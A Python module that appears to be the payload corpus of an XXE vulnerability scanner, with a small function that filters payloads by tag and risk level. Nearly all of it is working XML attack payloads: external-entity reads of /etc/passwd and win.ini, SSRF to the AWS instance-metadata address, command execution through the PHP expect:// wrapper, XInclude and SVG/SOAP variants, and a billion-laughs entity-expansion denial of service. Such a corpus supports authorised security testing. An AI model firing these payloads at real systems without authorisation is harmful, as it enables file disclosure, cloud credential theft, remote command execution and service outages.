"""XXE payload corpus — classic file read, OOB, parameter entities, SVG/SOAP wrappers."""

from __future__ import annotations

from typing import Any

_PAYLOADS: list[dict[str, Any]] = [
    {
        "id": "file-passwd",
        "title": "Classic file /etc/passwd",
        "vector": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
        "expect": ["root:"],
        "risk": 2,
        "tags": ["file", "linux"],
    },
    {
        "id": "file-win-ini",
        "title": "Classic file win.ini",
        "vector": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>""",
        "expect": ["fonts", "[extensions]"],
        "risk": 2,
        "tags": ["file", "windows"],
    },
    {
        "id": "file-passwd-param",
        "title": "Parameter entity file read",
        "vector": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY call SYSTEM "file:///etc/passwd">]><foo>&call;</foo>""",
        "expect": ["root:"],
        "risk": 2,
        "tags": ["file", "param"],
    },
    {
        "id": "ssrf-aws",
        "title": "XXE to AWS metadata",
        "vector": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>""",
        "expect": ["ami-id", "instance-id", "meta-data"],
        "risk": 3,
        "tags": ["ssrf", "cloud"],
    },
    {
        "id": "expect-php",
        "title": "PHP expect wrapper",
        "vector": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>""",
        "expect": ["uid="],
        "risk": 3,
        "tags": ["rce", "php"],
    },
    {
        "id": "svg-xxe",
        "title": "SVG wrapper XXE",
        "vector": """<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>""",
        "expect": ["root:"],
        "risk": 2,
        "tags": ["svg", "file"],
    },
    {
        "id": "soap-xxe",
        "title": "SOAP envelope XXE",
        "vector": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>""",
        "expect": ["root:"],
        "risk": 2,
        "tags": ["soap", "file"],
    },
    {
        "id": "utf16-probe",
        "title": "UTF-16 encoding probe",
        "vector": """<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
        "expect": ["root:"],
        "risk": 3,
        "tags": ["encoding"],
    },
    {
        "id": "xinclude",
        "title": "XInclude file read",
        "vector": """<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>""",
        "expect": ["root:"],
        "risk": 2,
        "tags": ["xinclude"],
    },
    {
        "id": "billion-laughs-lite",
        "title": "Entity expansion (lite DoS probe)",
        "vector": """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">]><lolz>&lol5;</lolz>""",
        "expect": [],
        "risk": 3,
        "tags": ["dos"],
        "note": "Watch for timeout / 500 — do not use heavy expansion in prod scans",
    },
]


def list_payloads(tags: str = "", risk: int = 3) -> dict[str, Any]:
    want = {t.strip() for t in tags.split(",") if t.strip()} if tags else set()
    out = []
    for p in _PAYLOADS:
        if p["risk"] > int(risk):
            continue
        if want and not want.intersection(set(p.get("tags") or [])):
            continue
        out.append(p)
    return {"count": len(out), "payloads": out, "corpus_total": len(_PAYLOADS)}
